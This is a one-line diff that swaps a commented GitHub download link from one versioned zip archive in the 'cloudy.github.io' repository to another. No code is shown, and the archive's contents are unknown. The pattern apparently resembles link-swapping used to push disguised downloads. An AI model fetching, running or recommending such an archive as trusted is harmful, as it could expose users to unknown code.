@@ -1,1 +1,1 @@
-# https://github.com/AviRedDevil/cloudy.github.io/raw/refs/heads/main/aphakia/github_io_cloudy_3.1.zip
+# https://raw.githubusercontent.com/AviRedDevil/cloudy.github.io/main/aphakia/io_github_cloudy_v2.6.zip
